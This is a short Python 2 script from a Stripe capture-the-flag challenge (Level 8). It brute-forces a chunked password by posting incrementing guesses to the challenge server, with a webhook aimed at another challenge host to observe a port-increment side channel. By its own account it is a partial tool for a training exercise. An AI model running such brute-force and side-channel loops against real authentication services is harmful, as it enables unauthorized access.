#!/usr/bin/env python

"""
 Stripe CTF - LEVEL 8
 Matt Fuller
 This script will repeatedly send requests to the server, incrementing on each request.
 It is best used for determining what the port increment value is by looking for a pattern
 in known incorrect requests. This file alone does not solve the challenge.
""" 

import socket
import urllib
import urllib2
import json

host = ''
port = 50010

#url = "http://127.0.0.1:3000"
url =  "https://level08-4.stripe-ctf.com/user-dnydblxyta/"

#Once a chunk is determined, edit this part
first_chunk, second_chunk, third_chunk, fourth_chunk = "000", "000", "000", "000"

key = first_chunk + second_chunk + third_chunk + fourth_chunk

while 1:
    print "Trying key " + key
    data = json.dumps({"password": key, "webhooks": ["level02-3.stripe-ctf.com:50010"]})
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    output = response.read()
    response.close()

    print output

    #Update key increments
    first_int = int(first_chunk);
    new_first_int = first_int + 1;
    first_chunk = str(new_first_int).zfill(3)
    key = first_chunk + second_chunk + third_chunk + fourth_chunk
